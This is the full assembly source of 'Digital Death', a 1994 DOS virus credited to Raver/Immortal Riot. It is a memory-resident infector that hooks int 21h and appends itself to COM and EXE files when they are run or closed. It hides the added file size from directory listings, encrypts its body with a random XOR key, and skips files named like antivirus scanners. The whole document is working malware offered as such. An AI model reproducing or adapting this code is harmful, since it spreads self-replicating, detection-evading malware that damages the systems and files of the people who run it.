; ------------------------------------------------------------------------------
;
;                        - Digital Death -       
;       Created by Immortal Riot's destructive development team
;                  (c) 1994 Raver/Immortal Riot     
;
;-------------------------------------------------------------------------------
;       ş Memory Resident Stealth Infector of COM/EXE programs ş
;-------------------------------------------------------------------------------
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;                       DIGITAL DEATH - ver 0.90á
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä

cseg    segment byte public 'code'
	assume cs:cseg, ds:cseg

	org 100h

vir_size equ end_of_virus-start_of_virus


; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;                        Non-resident Install code
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä

start_of_virus:
    call get_delta
get_delta:                          ;get the delta offset
    mov di,sp
    mov bp,word ptr ss:[di]
    sub bp,offset get_delta

    push cs
    pop ds

    call encrypt_decrypt            ;decrypt virus

; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;                        Start of encrypted area                 
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä

install_code:

    mov ax,es                       ;restore segments now due to prefetch!!
    add ax,10h
    add word ptr cs:[bp+EXEret+2],ax
    add word ptr cs:[bp+EXEstack],ax

    push es

    mov ax,7979h                    ;check if already in mem
    int 21h
    cmp ax,'iR'
    je already_resident

    mov ah,4ah                      ;get #of available paragraphs in bx
    mov bx,0ffffh
    int 21h

    sub bx,(vir_size+15)/16+1       ;recalculate and 
    mov ah,4ah
    int 21h

    mov ah,48h                      ;allocate enough mem for virus
    mov bx,(vir_size+15)/16
    int 21h
    jc already_resident             ;exit if error

    dec ax                          ;ax-1 = MCB
    mov es,ax
    mov word ptr es:[1],8           ;Mark DOS as owner

    push ax                         ;save for later use

    mov ax,3521h                    ;get interrupt vector for int21h
    int 21h
    mov word ptr ds:[OldInt21h],bx
    mov word ptr ds:[OldInt21h+2],es

    pop ax                          ;ax = MCB for allocated mem
    push cs
    pop ds

    cld                             ;cld for movsw
    sub ax,0fh                      ;es:[100h] = start of allocated mem
    mov es,ax
    mov di,100h
    lea si,[bp+offset start_of_virus]
    mov cx,(vir_size+1)/2           ;copy entire virii to mem
    rep movsw

    push es
    pop ds

    mov dx,offset new_int21h        ;hook int21h to new_int21h
    mov ax,2521h
    int 21h

already_resident:

    push cs
    push cs
    pop es
    pop ds

    cmp byte ptr [bp+COMflag],1     ;check if COM or EXE
    jne exit_EXE

exit_COM:                           ;exit procedure for COMs
    mov di,100h
    lea si,[bp+COMret]
    mov cx,3
    rep movsb                       ;restore first three bytes

    pop es                          ;and jmp to beginning
    mov ax,100h
    jmp ax

exit_EXE:                           ;exit procedure for EXEs
    pop es
    mov ax,es                       ;restore segment regs and ss:sp
    mov ds,ax
    cli
    mov ss,word ptr cs:[bp+EXEstack]
    mov sp,word ptr cs:[bp+EXEstack+2]
    sti

db 0eah                             ;and jmp to cs:ip
EXEret db 0,0,0,0
EXEstack dd 0

; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;                           New int 21h handler
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä

new_int21h:

    cmp ax,7979h                    ;return installation check
    jne continue
    mov ax,'iR'
    iret
continue:
    cmp ax,4b00h                    ;check for exec?
    jne check_dir
    jmp infect
check_dir:
    cmp ah,11h                      ;if dir function 11h, 12h
    je hide_dir
    cmp ah,12h
    je hide_dir
    cmp ah,4eh                      ;or function 4eh, 4fh
    je hide_dir2
    cmp ah,4fh
    je hide_dir2                    ;do some dir stealth
    cmp ah,3eh                      ;check for close
    jne do_oldint
    jmp infect_close
do_oldint:
    jmp do_oldint21h                ;else do original int 21h

; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;                          Dir stealth routines
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä

hide_dir:                           ;FCB stealth routine
    pushf                           ;simulate a int call with pushf
    push cs                         ;and cs, ip on the stack
    call do_oldint21h
    or al,al                        ;was the dir call sucessfull??
    jnz skip_dir                    ;if not skip it

    push ax bx es                   ;preserve registers in use

    mov ah,62h                      ;same as 51h - get current PSP to es:bx
    int 21h
    mov es,bx
    cmp bx,es:[16h]                 ;is the PSP ok??
    jnz bad_psp                     ;if not quit

    mov bx,dx
    mov al,[bx]                     ;al holds current drive - FFh means
    push ax                         ;extended FCB
    mov ah,2fh                      ;get DTA-area
    int 21h
    pop ax
    inc al                          ;is it an extended FCB
    jnz no_ext
    add bx,7                        ;if so add 7
no_ext:
    mov al,byte ptr es:[bx+17h]     ;get seconds field
    and al,1fh
    xor al,1dh                      ;is the file infected??
    jnz no_stealth                  ;if not - don't hide size

    cmp word ptr es:[bx+1dh],vir_size       ;if size is smaller than vir_size
    ja hide_it                              
    cmp word ptr es:[bx+1fh],0              ;it can't be infected
    je no_stealth                           ;so don't hide it
hide_it:                                    
    sub word ptr es:[bx+1dh],vir_size       ;else sub vir_size
    sbb word ptr es:[bx+1fh],0
no_stealth:
bad_psp:
    pop es bx ax                    ;restore regs
skip_dir:
    iret                            ;return to program

hide_dir2:
    pushf                           ;simulate a int call - push flags, cs and
    push cs                         ;ip on stack and jump to int handler
    call do_oldint21h
    jc eofs                         ;if no more files - return

    push ax es bx                   ;preserve registers
    mov ah,2fh                      ;get DTA-area
    int 21h

    mov ax,es:[bx+16h]
    and ax,1fh                      ;is the PSP ok??
    xor al,29
    jnz not_inf                     ; if not - jmp

    cmp word ptr es:[bx+1ah],vir_size        ;don't sub too small files
    ja sub_it
    cmp word ptr es:[bx+1ch],0
    je not_inf
sub_it:
    sub word ptr es:[bx+1ah],vir_size        ;sub vir_size
    sbb word ptr es:[bx+1ch],0
not_inf:
    pop bx es ax                    ;restore registers
eofs:
    retf 2                          ;return and pop 2 of stack


; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;                        Infect on close routine
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä

infect_close:
    push es bp ax bx cx si di ds dx
    cmp bx,4                        ;don't close NULL, AUX and so
    jbe no_close

    call check_name                 ;es:di points to file name
    add di,8                        ;es:di points to extension
    cmp word ptr es:[di],'OC'
    jne try_again
    cmp byte ptr es:[di+2],'M'      ;if COM or EXE - infect
    je close_infection
try_again:
    cmp word ptr es:[di],'XE'
    jne no_close
    cmp byte ptr es:[di+2],'E'
    je close_infection

no_close:
    pop dx ds di si cx bx ax bp es  ;otherwise jmp to oldint
    jmp do_oldint21h

close_infection:
    mov byte ptr es:[di-26h],2      ;mark read & write access
    mov cs:Closeflag,1              ;raise closeflag for exit procedure
    mov ax,4200h                    ;rewind file
    xor cx,cx
    cwd
    int 21h
    jmp infect_on_close             ;infect it


; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;                  Determine file name for open handle
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä

check_name:
    push bx
    mov ax,1220h                    ;get job file table for handle at es:di
    int 2fh

    mov ax,1216h                    ;get system file table
    mov bl,byte ptr es:[di]         ;for handle index in bx
    int 2fh
    pop bx

    add di,20h                      ;es:di+20h points to file name

    ret                             ;return

; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;                          Infection routine
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä

infect:

    push es bp ax bx cx si di ds dx

    mov cs:Closeflag,0              ;make sure closeflag is off

    mov ax,4300h                    ;get attrib
    int 21h
    push cx
    mov ax,4301h                    ;and clear attrib
    xor cx,cx                       
    int 21h

    mov ax,3d02h                    ;open file
    int 21h
    xchg ax,bx

infect_on_close:                    ;entry point if infection at close

    push cs
    push cs
    pop ds
    pop es

    mov ax,5700h                    ;save and check time/date stamp
    int 21h
    push dx
    push cx
    and cl,1fh
    xor cl,1dh
    jne read_it
    jmp skip_infect

read_it:
    mov ah,3fh                      ;read first 18h bytes 
    mov cx,18h
    mov dx,offset EXEheader         ;to EXEheader
    int 21h

    mov byte ptr COMflag,0          ;check if EXE or COM and mark COMflag
    cmp word ptr EXEheader,'ZM'
    je is_EXE
    cmp word ptr EXEheader,'MZ'
    je is_EXE
    mov byte ptr COMflag,1

is_EXE:
    mov ax,4202h                    ;goto end of file
    xor cx,cx
    cwd
    int 21h   

    push ax                         ;else save ax and infect EXE
    push es
    call check_name

    cmp COMflag,1                   ;if COM file continue to infect_COM
    je infect_COM

infect_EXE:
    cmp word ptr es:[di],'CS'       ;check for common virus scanners
    je is_scanner
    cmp word ptr es:[di],'BT'
    je is_scanner
    cmp word ptr es:[di],'-F'
    je is_scanner
    cmp word ptr es:[di],'OT'
    je is_scanner
    cmp word ptr es:[di],'IV'
    jne no_scanner
is_scanner:
    pop es
    jmp skip_infect
no_scanner:
    pop es


    mov di,offset EXEret            ;EXEret = IP/CS
    mov si,offset EXEheader+14h
    mov cx,2
    rep movsw

    mov si,offset EXEheader+0eh     ;EXEstack = SS/SP
    mov cx,2
    rep movsw

    pop ax                          ;restore ax and

    mov cx,10h
    div cx
    sub ax,word ptr [EXEheader+8h]
    mov word ptr [EXEheader+14h],dx       ;calculate CS:IP
    mov word ptr [EXEheader+16h],ax
    add ax,100
    mov word ptr [EXEheader+0eh],ax       ;SS:SP
    mov word ptr [EXEheader+10h],100h
    jmp short more_infection

infect_COM:

    cmp word ptr es:[di],'OC'             ;dont infect command.com!
    pop es
    pop ax
    jne no_command_com
    jmp skip_infect

no_command_com:
    mov di,offset COMret            ;transfer first three bytes
    mov si,offset EXEheader         ;could remove this and transfer
    mov cx,3                        ;directly from EXEheader instead
    rep movsb                       ;doing so will save approximately 20 bytes

    sub ax,3                        ;subtract three from file length
    mov byte ptr [EXEheader],0e9h   ;and build initial jump
    mov word ptr [EXEheader+1],ax

more_infection:

    mov ah,2ch                      ;get random number from time
    int 21h
    mov word ptr ds:[enc_val],dx    ;store it
    mov ax,08d00h
    mov es,ax
    mov di,100h
    mov si,di
    mov cx,(vir_size+1)/2
    rep movsw
    push es
    pop ds
    xor bp,bp
    call encrypt_decrypt            ;and encrypt


    mov ah,40h                      ;write it to file
    mov cx,vir_size
    mov dx,offset start_of_virus
    int 21h

    push cs
    pop ds

    cmp byte ptr COMflag,0          ;if COM file skip the next part
    jne goto_start

    mov ax,4202h                    ;go to end of file
    xor cx,cx
    cwd
    int 21h

    mov cx,512                      ;recalculate new file length in 512-
    div cx                          ;byte pages
    inc ax
    mov word ptr [EXEheader+2],dx
    mov word ptr [EXEheader+4],ax

goto_start:
    mov ax,4200h                    ;go to beginning of file
    xor cx,cx
    cwd
    int 21h

    cmp byte ptr [COMflag],1        ;if COM-file write first three bytes
    je write_3
    mov cx,18h                      ;else write whole EXE header
    jmp short write_18h
write_3:
    mov cx,3
write_18h:
    mov dx,offset EXEheader
    mov ah,40h
    int 21h

skip_infect:                        ;restore time/date and mark infected
    mov ax,5701h
    pop cx
    pop dx
    or cl,00011101b
    and cl,11111101b
    int 21h

    cmp byte ptr cs:[Closeflag],1   ;if infection on close - don't close file
    je dont_close
    mov ah,3eh
    int 21h     
    pop cx
dont_close:
    pop dx
    pop ds
    cmp byte ptr cs:[Closeflag],1   ;and don't restore attrib
    je exit_close
    mov ax,4301h
    int 21h
exit_close:
    mov byte ptr cs:Closeflag,0     ;unmark infection on close

    pop di si cx bx ax bp es

do_oldint21h:                       ;jump to old int21h
db 0eah
OldInt21h dd 0

Closeflag db 0
COMflag db 1
COMret db 0cdh,20h,00h
EXEheader db 18h dup(0)
signature db "Digital Death - v0.90á (c) '94 Raver/Immortal Riot"

end_of_encryption:

; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;    End of encryption - the code below this point is unencrypted
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä

enc_val dw 0                        ;value to en/decrypt with

encrypt_decrypt:
    mov dx,word ptr ds:[bp+enc_val]
    lea si,[bp+install_code]
    mov cx,(end_of_encryption-install_code)/2
loopy:
    xor word ptr ds:[si],dx         ;simple ordinary xor-loop
    inc si                          ;encryption
    inc si
    loop loopy
    ret

; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;                              End of virus
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä

end_of_virus:
cseg    ends
	end start_of_virus

